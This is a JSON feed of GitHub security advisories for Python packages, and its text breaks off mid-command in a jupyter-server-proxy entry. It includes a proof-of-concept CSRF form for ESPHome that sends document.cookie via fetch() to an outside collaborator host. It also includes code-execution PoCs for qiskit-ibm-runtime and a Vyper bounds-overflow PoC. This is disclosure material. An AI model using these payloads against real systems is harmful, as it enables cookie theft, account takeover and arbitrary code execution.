{
    "version": "https://jsonfeed.org/version/1",
    "title": "Security Advisory for Python packages hosted at PyPI.org",
    "home_page_url": "https://github.com/advisories?query=type%3Areviewed+ecosystem%3Apip",
    "feed_url": "https://azu.github.io/github-advisory-database-rss/pip.json",
    "description": "Security Advisory for Python packages hosted at PyPI.org on GitHub",
    "items": [
        {
            "content_html": "<p>An attacker is able to steal secrets and potentially gain remote code execution via CSRF using a self-hosted, open source Prefect API.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2023-6022\">https://nvd.nist.gov/vuln/detail/CVE-2023-6022</a></li>\n<li><a href=\"https://huntr.com/bounties/dab47d99-551c-4355-9ab1-c99cb90235af\">https://huntr.com/bounties/dab47d99-551c-4355-9ab1-c99cb90235af</a></li>\n<li><a href=\"https://github.com/PrefectHQ/prefect/blob/main/RELEASE-NOTES.md#release-2165\">https://github.com/PrefectHQ/prefect/blob/main/RELEASE-NOTES.md#release-2165</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-4hh5-2678-83fx\">https://github.com/advisories/GHSA-4hh5-2678-83fx</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-4hh5-2678-83fx",
            "title": "[prefect] Cross-Site Request Forgery vulnerability in Prefect",
            "date_modified": "2024-03-22T15:55:28.000Z",
            "date_published": "2023-11-16T18:30:31.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-4hh5-2678-83fx"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>A Cross-Site Request Forgery gives attackers the ability to upload many large files to a victim, if they are running Gradio locally. To resolve this a PR tightening the CORS rules around Gradio applications has been submitted. In particular, it checks to see if the host header is localhost (or one of its aliases) and if so, it requires the origin header (if present) to be localhost (or one of its aliases) as well.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-1727\">https://nvd.nist.gov/vuln/detail/CVE-2024-1727</a></li>\n<li><a href=\"https://github.com/gradio-app/gradio/commit/84802ee6a4806c25287344dce581f9548a99834a\">https://github.com/gradio-app/gradio/commit/84802ee6a4806c25287344dce581f9548a99834a</a></li>\n<li><a href=\"https://huntr.com/bounties/a94d55fb-0770-4cbe-9b20-97a978a2ffff\">https://huntr.com/bounties/a94d55fb-0770-4cbe-9b20-97a978a2ffff</a></li>\n<li><a href=\"https://github.com/gradio-app/gradio/pull/7503\">https://github.com/gradio-app/gradio/pull/7503</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-3x9g-xfj5-fq84\">https://github.com/advisories/GHSA-3x9g-xfj5-fq84</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-3x9g-xfj5-fq84",
            "title": "[gradio] Cross-Site Request Forgery in Gradio",
            "date_modified": "2024-03-22T13:12:18.000Z",
            "date_published": "2024-03-21T21:31:15.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-3x9g-xfj5-fq84"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h2 id=\"summary\">Summary</h2>\n<p><a href=\"https://github.com/vyperlang/vyper/blob/b01cd686aa567b32498fefd76bd96b0597c6f099/vyper/builtins/functions.py#L404-L457\">The bounds check for slices</a> does not account for the ability for <code>start + length</code> to overflow when the values aren't literals. </p>\n<p>If a <code>slice()</code> function uses a non-literal argument for the <code>start</code>  or <code>length</code> variable, this creates the ability for an attacker to overflow the bounds check. </p>\n<p>This issue can be used to do OOB access to storage, memory or calldata addresses. It can also be used to corrupt the <code>length</code> slot of the respective array.</p>\n<p>A contract search was performed and no vulnerable contracts were found in production.</p>\n<p>tracking in issue <a href=\"https://github.com/vyperlang/vyper/issues/3756\">https://github.com/vyperlang/vyper/issues/3756</a>.\npatched in <a href=\"https://github.com/vyperlang/vyper/pull/3818\">https://github.com/vyperlang/vyper/pull/3818</a>.</p>\n<h2 id=\"details\">Details</h2>\n<p>Here the flow for <code>storage</code> is supposed, but it is generalizable also for the other locations.</p>\n<p>When calling <code>slice()</code> on a storage value, there are compile time bounds checks if the <code>start</code> and <code>length</code> values are literals, but of course this cannot happen if they are passed values:</p>\n<pre><code class=\"language-python\">if not is_adhoc_slice:\n    if length_literal is not None:\n        if length_literal &lt; 1:\n            raise ArgumentException(\"Length cannot be less than 1\", length_expr)\n\n        if length_literal &gt; arg_type.length:\n            raise ArgumentException(f\"slice out of bounds for {arg_type}\", length_expr)\n\n    if start_literal is not None:\n        if start_literal &gt; arg_type.length:\n            raise ArgumentException(f\"slice out of bounds for {arg_type}\", start_expr)\n        if length_literal is not None and start_literal + length_literal &gt; arg_type.length:\n            raise ArgumentException(f\"slice out of bounds for {arg_type}\", node)\n</code></pre>\n<p>At runtime, we perform the following equivalent check, but the runtime check does not account for overflows:</p>\n<pre><code class=\"language-python\">[\"assert\", [\"le\", [\"add\", start, length], src_len]],  # bounds check\n</code></pre>\n<p>The storage <code>slice()</code> function copies bytes directly from storage into memory and returns the memory value of the resulting slice. This means that, if a user is able to input the <code>start</code>  or <code>length</code> value, they can force an overflow and access an unrelated storage slot.</p>\n<p>In most cases, this will mean they have the ability to forcibly return <code>0</code> for the slice, even if this shouldn't be possible. In extreme cases, it will mean they can return another unrelated value from storage.</p>\n<h2 id=\"poc-oob-access\">POC: OOB access</h2>\n<p>For simplicity, take the following Vyper contract, which takes an argument to determine where in a <code>Bytes[64]</code> bytestring should be sliced. It should only accept a value of zero, and should revert in all other cases.</p>\n<pre><code class=\"language-python\"># @version ^0.3.9\n\nx: public(Bytes[64])\nsecret: uint256\n\n@external\ndef __init__():\n    self.x = empty(Bytes[64])\n    self.secret = 42\n\n@external\ndef slice_it(start: uint256) -&gt; Bytes[64]:\n    return slice(self.x, start, 64)\n</code></pre>\n<p>We can use the following manual storage to demonstrate the vulnerability:</p>\n<pre><code class=\"language-json\">{\"x\": {\"type\": \"bytes32\", \"slot\": 0}, \"secret\": {\"type\": \"uint256\", \"slot\": 3618502788666131106986593281521497120414687020801267626233049500247285301248}}\n</code></pre>\n<p>If we run the following test, passing <code>max - 63</code> as the <code>start</code> value, we will overflow the bounds check, but access the storage slot at <code>1 + (2**256 - 63) / 32</code>, which is what was set in the above storage layout:</p>\n<pre><code class=\"language-solidity\">function test__slice_error() public {\n    c = SuperContract(deployer.deploy_with_custom_storage(\"src/loose/\", \"slice_error\", \"slice_error_storage\"));\n    bytes memory result = c.slice_it(115792089237316195423570985008687907853269984665640564039457584007913129639872); // max - 63\n    console.logBytes(result);\n}\n</code></pre>\n<p>The result is that we return the secret value from storage:</p>\n<pre><code>Logs:\n0x0000...00002a\n</code></pre>\n<h2 id=\"poc-length-corruption\">POC: <code>length</code> corruption</h2>\n<p><code>OOG</code> exception doesn't have to be raised - because of the overflow, only a few bytes can be copied, but the <code>length</code> slot is set with the original input value.</p>\n<pre><code class=\"language-python\">d: public(Bytes[256])\n    \n@external\ndef test():\n    x : uint256 = 115792089237316195423570985008687907853269984665640564039457584007913129639935 # 2**256-1\n    self.d = b\"\\x01\\x02\\x03\\x04\\x05\\x06\"\n    # s : Bytes[256] = slice(self.d, 1, x)\n    assert len(slice(self.d, 1, x))==115792089237316195423570985008687907853269984665640564039457584007913129639935\n</code></pre>\n<p>The corruption of <code>length</code> can be then used to read dirty memory:</p>\n<pre><code class=\"language-python\">@external\ndef test():\n    x: uint256 = 115792089237316195423570985008687907853269984665640564039457584007913129639935  # 2**256 - 1\n    y: uint256 = 22704331223003175573249212746801550559464702875615796870481879217237868556850   # 0x3232323232323232323232323232323232323232323232323232323232323232\n    z: uint96 = 1\n    if True:\n        placeholder : uint256[16] = [y, y, y, y, y, y, y, y, y, y, y, y, y, y, y, y]\n    s :String[32] = slice(uint2str(z), 1, x)\t# uint2str(z) == \"1\"\n    #print(len(s))\n    assert slice(s, 1, 2) == \"22\"\n</code></pre>\n<h2 id=\"impact\">Impact</h2>\n<p>The built-in <code>slice()</code> method can be used for OOB accesses or the corruption of the <code>length</code> slot.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/vyperlang/vyper/security/advisories/GHSA-9x7f-gwxq-6f2c\">https://github.com/vyperlang/vyper/security/advisories/GHSA-9x7f-gwxq-6f2c</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-24561\">https://nvd.nist.gov/vuln/detail/CVE-2024-24561</a></li>\n<li><a href=\"https://github.com/vyperlang/vyper/issues/3756\">https://github.com/vyperlang/vyper/issues/3756</a></li>\n<li><a href=\"https://github.com/vyperlang/vyper/blob/b01cd686aa567b32498fefd76bd96b0597c6f099/vyper/builtins/functions.py#L404-L457\">https://github.com/vyperlang/vyper/blob/b01cd686aa567b32498fefd76bd96b0597c6f099/vyper/builtins/functions.py#L404-L457</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-9x7f-gwxq-6f2c\">https://github.com/advisories/GHSA-9x7f-gwxq-6f2c</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-9x7f-gwxq-6f2c",
            "title": "[vyper] Vyper's bounds check on built-in `slice()` function can be overflowed",
            "date_modified": "2024-03-21T21:59:42.000Z",
            "date_published": "2024-02-01T20:51:32.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-9x7f-gwxq-6f2c"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"summary\">Summary</h3>\n<p>API endpoints in dashboard component of ESPHome version 2023.12.9 (command line installation) are vulnerable to Cross-Site Request Forgery (CSRF) allowing remote attackers to carry out attacks against a logged user of the dashboard to perform operations on configuration files (create, edit, delete).</p>\n<h3 id=\"details\">Details</h3>\n<p>It is possible for a malicious actor to create a specifically crafted web page that triggers a cross site request against ESPHome, this allows bypassing the authentication for API calls on the platform.</p>\n<h3 id=\"poc\">PoC</h3>\n<p>An example of malicious web page that abuses this vulnerability:</p>\n\n  \n    <form enctype=\"text/plain\" method=\"POST\" id=\"#main\" action=\"http://localhost:6052/edit?configuration=poc.yaml\">\n      <input value=\"y', {method: 'POST',mode: 'no-cors',body:document.cookie});</script>\" name=\"<script>\r\nfetch('https://907zv9yp9u3rjerkiakydpvcr3xulk99.oastify.com?x\" type=\"hidden\">\n    </form>\n\n<pre><code>&lt;script&gt;\n  document.forms[0].submit();\n&lt;/script&gt;\n\n&lt;script&gt;\n&lt;/script&gt;\n</code></pre>\n  \n\n\n<p>In which an attacker creates and weaponizes \"poc.yaml\" config file containing a cookie exfiltration script and forces the payload triggering visiting the vulnerable page.</p>\n<p>Example of such script:</p>\n\n\n\n<h3 id=\"impact\">Impact</h3>\n<p>This vulnerability allows bypassing authentication on API calls accessing configuration file operations on the behalf of a logged user. In order to trigger the vulnerability, the victim must visit a weaponized page.</p>\n<p>In addition to this, it is possible to chain this vulnerability with GHSA-9p43-hj5j-96h5 (as seen in the PoC) to obtain a complete takeover of the user account.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/esphome/esphome/security/advisories/GHSA-5925-88xh-6h99\">https://github.com/esphome/esphome/security/advisories/GHSA-5925-88xh-6h99</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-9p43-hj5j-96h5\">https://github.com/advisories/GHSA-9p43-hj5j-96h5</a></li>\n<li><a href=\"https://github.com/esphome/esphome/pull/6396\">https://github.com/esphome/esphome/pull/6396</a></li>\n<li><a href=\"https://github.com/esphome/esphome/pull/6397\">https://github.com/esphome/esphome/pull/6397</a></li>\n<li><a href=\"https://github.com/esphome/esphome/commit/c56c40cb824e34ed2b89ba1cb8a3a5eb31459c74\">https://github.com/esphome/esphome/commit/c56c40cb824e34ed2b89ba1cb8a3a5eb31459c74</a></li>\n<li><a href=\"https://github.com/esphome/esphome/releases/tag/2024.3.0\">https://github.com/esphome/esphome/releases/tag/2024.3.0</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-5925-88xh-6h99\">https://github.com/advisories/GHSA-5925-88xh-6h99</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-5925-88xh-6h99",
            "title": "[esphome] ESPHome vulnerable to Authentication bypass via Cross site request forgery",
            "date_modified": "2024-03-22T15:42:47.000Z",
            "date_published": "2024-03-21T16:26:35.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-5925-88xh-6h99"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>core.py in Mitogen before 0.2.8 has a typo that drops the unidirectional-routing protection mechanism in the case of a child that is initiated by another child. The Ansible extension is unaffected. NOTE: the vendor disputes this issue because it is exploitable only in conjunction with hypothetical other factors, i.e., an affected use case within a library caller, and a bug in the message receiver policy code that led to reliance on this extra protection mechanism.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2019-15149\">https://nvd.nist.gov/vuln/detail/CVE-2019-15149</a></li>\n<li><a href=\"https://github.com/dw/mitogen/commit/5924af1566763e48c42028399ea0cd95c457b3dc\">https://github.com/dw/mitogen/commit/5924af1566763e48c42028399ea0cd95c457b3dc</a></li>\n<li><a href=\"https://mitogen.networkgenomics.com/changelog.html#v0-2-8-2019-08-18\">https://mitogen.networkgenomics.com/changelog.html#v0-2-8-2019-08-18</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-8rf6-w2mx-4xjh\">https://github.com/advisories/GHSA-8rf6-w2mx-4xjh</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-8rf6-w2mx-4xjh",
            "title": "[mitogen] Undirectional routing wasn't respected in some cases in Mitogen",
            "date_modified": "2024-03-21T16:17:13.000Z",
            "date_published": "2019-08-19T23:45:47.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-8rf6-w2mx-4xjh"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h2 id=\"summary-and-impact\">Summary and impact</h2>\n<p><a href=\"https://oauthenticator.readthedocs.io/en/latest/reference/api/gen/oauthenticator.google.html#oauthenticator.google.GoogleOAuthenticator.hosted_domain\"><code>GoogleOAuthenticator.hosted_domain</code></a> is used to restrict what Google accounts can be authorized to access a JupyterHub. The restriction <em>is intended</em> to ensure Google accounts are part of one or more Google organizations/workspaces verified to control specified domain(s).</p>\n<p>The vulnerability is that the actual restriction has been to Google accounts with emails ending with the domain. Such accounts could have been created by anyone which at one time was able to read an email associated with the domain. This was described by Dylan Ayrey (@dxa4481) in this <a href=\"https://trufflesecurity.com/blog/google-oauth-is-broken-sort-of/\">blog post</a> from 15th December 2023.</p>\n<h2 id=\"remediation\">Remediation</h2>\n<p>Upgrade to <code>oauthenticator&gt;=16.3.0</code> or restrict who can login another way, such as <a href=\"https://oauthenticator.readthedocs.io/en/latest/reference/api/gen/oauthenticator.google.html#oauthenticator.google.GoogleOAuthenticator.allowed_users\"><code>allowed_users</code></a> or <a href=\"https://oauthenticator.readthedocs.io/en/latest/reference/api/gen/oauthenticator.google.html#oauthenticator.google.GoogleOAuthenticator.allowed_google_groups\"><code>allowed_google_groups</code></a>.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/jupyterhub/oauthenticator/security/advisories/GHSA-55m3-44xf-hg4h\">https://github.com/jupyterhub/oauthenticator/security/advisories/GHSA-55m3-44xf-hg4h</a></li>\n<li><a href=\"https://github.com/jupyterhub/oauthenticator/commit/5246b09675501b09fb6ed64022099b7644812f60\">https://github.com/jupyterhub/oauthenticator/commit/5246b09675501b09fb6ed64022099b7644812f60</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-29033\">https://nvd.nist.gov/vuln/detail/CVE-2024-29033</a></li>\n<li><a href=\"https://trufflesecurity.com/blog/google-oauth-is-broken-sort-of\">https://trufflesecurity.com/blog/google-oauth-is-broken-sort-of</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-55m3-44xf-hg4h\">https://github.com/advisories/GHSA-55m3-44xf-hg4h</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-55m3-44xf-hg4h",
            "title": "[oauthenticator] GoogleOAuthenticator.hosted_domain incorrectly verifies membership of an Google organization/workspace",
            "date_modified": "2024-03-20T21:37:47.000Z",
            "date_published": "2024-03-20T18:02:07.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-55m3-44xf-hg4h"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"summary\">Summary</h3>\n<p>deserializing json data using <code>qiskit_ibm_runtime.RuntimeDecoder</code> can be made to execute arbitrary code given a correctly formatted input string</p>\n<h3 id=\"details\">Details</h3>\n<p><code>RuntimeDecoder</code> is supposed to be able to deserialize JSON strings containing various special types encoded via <code>RuntimeEncoder</code>. However, one can structure a malicious payload to cause the decoder to spawn a subprocess and execute arbitrary code, exploiting this block of code: <a href=\"https://github.com/Qiskit/qiskit-ibm-runtime/blob/16e90f475e78a9d2ae77daa139ef750cfa84ca82/qiskit_ibm_runtime/utils/json.py#L156-L159\">https://github.com/Qiskit/qiskit-ibm-runtime/blob/16e90f475e78a9d2ae77daa139ef750cfa84ca82/qiskit_ibm_runtime/utils/json.py#L156-L159</a></p>\n<h3 id=\"poc\">PoC</h3>\n<pre><code class=\"language-python\">malicious_data = {\n    \"__type__\": \"settings\",\n    \"__module__\": \"subprocess\",\n    \"__class__\": \"Popen\",\n    \"__value__\": {\n        \"args\": [\"echo\", \"hi\"]\n    },\n}\njson_str = json.dumps(malicious_data)\n\n_ = json.loads(json_str, cls=qiskit_ibm_runtime.RuntimeDecoder)  # prints \"hi\" to the terminal\n</code></pre>\n<p>(where obviously \"echo hi\" can be replaced with something much more malicious)</p>\n<p>notably the following also makes it through the runtime API, with <code>malicious_data</code> serialized client-side via <code>RuntimeEncoder</code> (and therefore presumably deserialized server-side via <code>RuntimeDecoder</code>?)</p>\n<pre><code class=\"language-python\">service = qiskit_ibm_runtime(&lt;ibm_cloud_credentials&gt;)\njob = service.run(\"qasm3-runner\", malicious_data)\nprint(job.status())  # prints \"JobStatus.QUEUED\"\n</code></pre>\n<h3 id=\"impact\">Impact</h3>\n<p>i don't know if <code>qiskit_ibm_runtime.RuntimeDecoder</code> is used server-side so this may or may not be a serious vulnerability on your end (however it's definitely a security hole for anyone using the library to deserialize third-party data)</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/Qiskit/qiskit-ibm-runtime/security/advisories/GHSA-x4x5-jv3x-9c7m\">https://github.com/Qiskit/qiskit-ibm-runtime/security/advisories/GHSA-x4x5-jv3x-9c7m</a></li>\n<li><a href=\"https://github.com/Qiskit/qiskit-ibm-runtime/commit/b78fca114133051805d00043a404b25a33835f4d\">https://github.com/Qiskit/qiskit-ibm-runtime/commit/b78fca114133051805d00043a404b25a33835f4d</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-29032\">https://nvd.nist.gov/vuln/detail/CVE-2024-29032</a></li>\n<li><a href=\"https://github.com/Qiskit/qiskit-ibm-runtime/blob/16e90f475e78a9d2ae77daa139ef750cfa84ca82/qiskit_ibm_runtime/utils/json.py#L156-L159\">https://github.com/Qiskit/qiskit-ibm-runtime/blob/16e90f475e78a9d2ae77daa139ef750cfa84ca82/qiskit_ibm_runtime/utils/json.py#L156-L159</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-x4x5-jv3x-9c7m\">https://github.com/advisories/GHSA-x4x5-jv3x-9c7m</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-x4x5-jv3x-9c7m",
            "title": "[qiskit-ibm-runtime] `qiskit_ibm_runtime.RuntimeDecoder` can execute arbitrary code",
            "date_modified": "2024-03-20T21:37:57.000Z",
            "date_published": "2024-03-20T15:44:22.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-x4x5-jv3x-9c7m"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"summary\">Summary</h3>\n<p>An <code>eval()</code> method exists <code>Options._get_program_inputs</code>. This is bad in any case, but especially bad because <code>Options</code> are also used server side, so this has the potential to expose arbitrary code injection in runtime containers, now or at a later time.</p>\n<h3 id=\"details\">Details</h3>\n<p><a href=\"https://github.com/Qiskit/qiskit-ibm-runtime/blob/da94a42060f1a22e6f306227deb45b70e0075723/qiskit_ibm_runtime/options/options.py#L140\">https://github.com/Qiskit/qiskit-ibm-runtime/blob/da94a42060f1a22e6f306227deb45b70e0075723/qiskit_ibm_runtime/options/options.py#L140</a></p>\n<h3 id=\"poc\">PoC</h3>\n<p>A local exploit would be something like</p>\n<pre><code class=\"language-python\">from qiskit import transpiler\n\nclass BadActor(transpiler.CouplingMap):\n    def __str__(self):\n        return \"print('external code')\"\n</code></pre>\n<p>Where <code>print(\"external code\")</code> can be any arbitrary python code string.</p>\n<p>Then if you did a normal workflow and used a specifically constructed <code>CouplingMap</code> subclass like <code>BadActor</code> above:</p>\n<pre><code class=\"language-python\">from qiskit_ibm_runtime import QiskitRuntimeService, Session, Options, Sampler\nfrom qiskit import QuantumCircuit\n\ncmap = BadActor.from_line(42)\nservice = QiskitRuntimeService()\noptions = Options(optimization_level=1)\noptions.simulator = dict(coupling_map=cmap))\n\nbell = QuantumCircuit(2)\nbell.h(0)\nbell.cx(0, 1)\nbell.measure_all()\n\nwith Session(service=service, backend=\"ibmq_qasm_simulator\") as session:\n    sampler = Sampler(session=session, options=options).run(bell)\n</code></pre>\n<p>This will print <code>external code</code></p>\n<h3 id=\"impact\">Impact</h3>\n<p>Security vulnerability.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/Qiskit/qiskit-ibm-runtime/security/advisories/GHSA-cq96-9974-v8hm\">https://github.com/Qiskit/qiskit-ibm-runtime/security/advisories/GHSA-cq96-9974-v8hm</a></li>\n<li><a href=\"https://github.com/Qiskit/qiskit-ibm-runtime/commit/2e8c8c8df83ba310f52d1651a426bad879e0bd38\">https://github.com/Qiskit/qiskit-ibm-runtime/commit/2e8c8c8df83ba310f52d1651a426bad879e0bd38</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-cq96-9974-v8hm\">https://github.com/advisories/GHSA-cq96-9974-v8hm</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-cq96-9974-v8hm",
            "title": "[qiskit-ibm-runtime] Dynamic Variable Evaluation in qiskit-ibm-runtime",
            "date_modified": "2024-03-20T15:41:28.000Z",
            "date_published": "2024-03-20T15:41:26.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-cq96-9974-v8hm"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>Versions of the package black before 24.3.0 are vulnerable to Regular Expression Denial of Service (ReDoS) via the lines_with_leading_tabs_expanded function in the strings.py file. An attacker could exploit this vulnerability by crafting a malicious input that causes a denial of service.</p>\n<p>Exploiting this vulnerability is possible when running Black on untrusted input, or if you habitually put thousands of leading tab characters in your docstrings.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-21503\">https://nvd.nist.gov/vuln/detail/CVE-2024-21503</a></li>\n<li><a href=\"https://github.com/psf/black/commit/f00093672628d212b8965a8993cee8bedf5fe9b8\">https://github.com/psf/black/commit/f00093672628d212b8965a8993cee8bedf5fe9b8</a></li>\n<li><a href=\"https://github.com/psf/black/releases/tag/24.3.0\">https://github.com/psf/black/releases/tag/24.3.0</a></li>\n<li><a href=\"https://security.snyk.io/vuln/SNYK-PYTHON-BLACK-6256273\">https://security.snyk.io/vuln/SNYK-PYTHON-BLACK-6256273</a></li>\n<li><a href=\"https://github.com/pypa/advisory-database/tree/main/vulns/black/PYSEC-2024-48.yaml\">https://github.com/pypa/advisory-database/tree/main/vulns/black/PYSEC-2024-48.yaml</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-fj7x-q9j7-g6q6\">https://github.com/advisories/GHSA-fj7x-q9j7-g6q6</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-fj7x-q9j7-g6q6",
            "title": "[black] Black vulnerable to Regular Expression Denial of Service (ReDoS)",
            "date_modified": "2024-03-20T15:24:02.000Z",
            "date_published": "2024-03-19T06:30:52.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-fj7x-q9j7-g6q6"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h2 id=\"summary\">Summary</h2>\n<p><code>jupyter-server-proxy</code> is used to expose ports local to a Jupyter server listening to web traffic to the Jupyter server's <em>authenticated users</em> by proxying web requests and websockets. Dependent packages (<a href=\"https://www.wheelodex.org/projects/jupyter-server-proxy/rdepends/\">partial list</a>) also use <code>jupyter-server-proxy</code> to expose other popular interactive applications (such as <a href=\"https://github.com/jupyterhub/jupyter-rsession-proxy\">RStudio</a>, <a href=\"https://github.com/jupyterhub/jupyter-remote-desktop-proxy\">Linux Desktop via VNC</a>, <a href=\"https://github.com/betatim/vscode-binder\">Code Server</a>, <a href=\"https://github.com/holoviz/jupyter-panel-proxy\">Panel</a>, etc) along with the Jupyter server. This feature is commonly used in hosted environments (such as a JupyterHub) to expose non-Jupyter interactive frontends or APIs to the user.</p>\n<p><code>jupyter-server-proxy</code> did not check user authentication appropriately when proxying websockets, allowing unauthenticated access to anyone who had network access to the Jupyter server endpoint.</p>\n<h2 id=\"impact\">Impact</h2>\n<p>This vulnerability can allow unauthenticated remote access to any websocket endpoint set up to be accessible via <code>jupyter-server-proxy</code>. In many cases (such as when exposing RStudio via <a href=\"https://github.com/jupyterhub/jupyter-rsession-proxy\"><code>jupyter-rsession-proxy</code></a> or a remote Linux Desktop / VNC via <a href=\"https://github.com/jupyterhub/jupyter-remote-desktop-proxy\"><code>jupyter-remote-desktop-proxy</code></a>), this leads to <strong>remote unauthenticated arbitrary code execution</strong>, due to how they use websockets. The websocket endpoints exposed by <code>jupyter_server</code> itself is not affected. Projects that do not rely on websockets are also not affected.</p>\n<h2 id=\"remediation\">Remediation</h2>\n<p>Upgrade <code>jupyter-server-proxy</code> to a patched version and restart any running Jupyter server.</p>\n<p>You may not be installing <code>jupyter-server-proxy</code> directly, but have it be pulled in as a dependency (<a href=\"https://www.wheelodex.org/projects/jupyter-server-proxy/rdepends/\">partial list of dependent packages</a>) - so you may be vulnerable even if you aren't directly depending on <code>jupyter-server-proxy</code>.</p>\n<h3 id=\"for-jupyterhub-admins-of-tljh-installations\">For JupyterHub admins of <a href=\"https://tljh.jupyter.org\">TLJH</a> installations</h3>\n<details><summary>Expand to read more</summary>\n\n<p>To secure a tljh deployment's user servers, first check if <code>jupyter-server-proxy</code> is installed in the user environment with a vulnerable version. If it is, patch the vulnerability and consider terminating currently running user servers.</p>\n<h4 id=\"1-check-for-vulnerability\">1. Check for vulnerability</h4>\n<p>As an JupyterHub admin from a terminal in a started user server, you can do:</p>\n<pre><code class=\"language-bash\">sudo -E python3 -c '\ntry:\n    import jupyter_server_proxy\n    is_vulnerable = not hasattr(jupyter_server_proxy, \"__version__\")\nexcept:\n    is_vulnerable = False\nif is_vulnerable:\n    print(\"WARNING: jupyter-server-proxy __is vulnerable__ to GHSA-w3vc-fx9p-wp4v, see https://github.com/jupyterhub/jupyter-server-proxy/security/advisories/GHSA-w3vc-fx9p-wp4v.\")\nelse:\n    print(\"INFO: not vulnerable to GHSA-w3vc-fx9p-wp4v\")\n'\n</code></pre>\n<p>Alternatively as a root user on the server where tljh is installed, you can do:</p>\n<pre><code class=\"language-bash\">sudo PATH=/opt/tljh/user/bin:${PATH} python3 -c '\ntry:\n    import jupyter_server_proxy\n    is_vulnerable = not hasattr(jupyter_server_proxy, \"__version__\")\nexcept:\n    is_vulnerable = False\nif is_vulnerable:\n    print(\"WARNING: jupyter-server-proxy __is vulnerable__ to GHSA-w3vc-fx9p-wp4v, see https://github.com/jupyterhub/jupyter-server-proxy/security/advisories/GHSA-w3vc-fx9p-wp4v.\")\nelse:\n    print(\"INFO: not vulnerable to GHSA-w3vc-fx9p-wp4v\")\n'\n</code></pre>\n<h4 id=\"2-patch-detected-vulnerability\">2. Patch detected vulnerability</h4>\n<p>As an JupyterHub admin from a terminal in a started user server, you can do:</p>\n<pre><code class=\"language-bash\">sudo -E pip install \"jupyter-server-proxy&gt;=3.2.3,!=4.0.0,!=4.1.0\"\n</code></pre>\n<p>Alternatively as a root user on the server where tljh is installed, you can do:</p>\n<pre><code class=\"language-bash\">sudo PATH=/opt/tljh/user/bin:${PATH} pip install \"jupyter-server-proxy&gt;=3.2.3,!=4.0.0,!=4.1.0\"\n</code></pre>\n<h4 id=\"3-consider-terminating-currently-running-user-servers\">3. Consider terminating currently running user servers</h4>\n<p>User servers that started before the patch was applied are still vulnerable. To ensure they aren't vulnerable any more you could forcefully terminate their servers via the JupyterHub web interface at <code>https://&lt;your domain&gt;/hub/admin</code>.</p>\n</details>\n\n<h3 id=\"for-jupyterhub-admins-of-z2jh-installations\">For JupyterHub admins of <a href=\"https://z2jh.jupyter.org\">Z2JH</a> installations</h3>\n<details><summary>Expand to read more</summary>\n\n<p>To secure your z2jh deployment's user servers, first consider if one or more user environments is or may be vulnerable, then ensure new user servers' aren't started with the vulnerability, and finally consider terminating currently running user servers. The steps below guide you to do so.</p>\n<h4 id=\"1-check-for-vulnerabilities\">1. Check for vulnerabilities</h4>\n<p>Consider all docker images that user servers' environment may be based on. If your deployment expose a fixed set of images, you may be able to update them to non-vulnerable versions.</p>\n<p>To check if an individual docker image is vulnerable, use a command like:</p>\n<pre><code class=\"language-bash\">CHECK_IMAGE=jupyter/base-notebook:2023-10-20\ndocker run --rm $CHECK_IMAGE python3 